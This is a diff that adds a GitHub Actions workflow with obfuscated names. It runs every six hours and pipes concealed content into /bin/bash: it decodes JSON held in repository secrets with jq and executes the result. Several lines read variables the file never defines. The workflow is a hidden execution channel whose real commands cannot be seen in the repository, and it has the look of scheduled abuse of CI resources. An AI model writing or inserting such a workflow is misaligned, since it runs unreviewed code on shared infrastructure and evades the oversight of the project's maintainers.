@@ -1,0 +1,21 @@
+name: songstrange
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songstrange
+        env:
+          lylg904: ${{ secrets.lylg904 }}
+        run: |
+          echo $lylg904 | jq -r .j8 | /bin/bash
+          echo $ieo296 | jq -r .cesn933 | /bin/bash
+          echo $z77618 | jq -r .wvdb70 | /bin/bash
+          echo $qptvn5661 | jq -r .gatw0 | /bin/bash
+          echo $tjxfw62326 | jq -r .si1 | /bin/bash
+
